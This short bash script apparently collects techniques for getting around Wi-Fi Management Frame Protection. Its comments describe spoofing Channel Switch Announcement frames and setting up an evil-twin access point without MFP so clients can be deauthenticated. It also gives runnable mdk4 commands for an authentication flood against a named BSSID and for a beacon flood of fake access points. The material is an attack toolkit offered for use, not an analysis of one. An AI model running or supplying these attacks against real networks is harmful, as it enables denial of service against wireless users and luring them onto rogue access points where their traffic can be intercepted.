#!/bin/bash
# Bypass 1: Channel Switch Announcement (CSA) injection
# Spoof CSA action frames from the AP, telling clients to move to a different channel.
# Clients obey CSA even with MFP — it's processed before authentication.
# mdk4 has no CSA mode, so craft the action frames with Scapy (or a dedicated
# CSA-injection tool) rather than trying to do it with a deauth command.

# Bypass 2: Rogue AP on same SSID without MFP
# If AP uses MFPC (optional), create a twin without MFP
# Clients that connect to your AP won't have MFP protection
# Then deauth them from your own AP freely

# Bypass 3: Auth flood (exhaust AP association table)
# Flood the AP with fake authentication requests
# When association table is full, legitimate clients can't re-associate
sudo mdk4 wlan0mon a -a 14:8C:4A:B4:F4:8C

# Bypass 4: Beacon flood to confuse clients
# Create hundreds of fake APs on the same channel
# Overwhelms client network selection
sudo mdk4 wlan0mon b -f ssid-list.txt -c 6
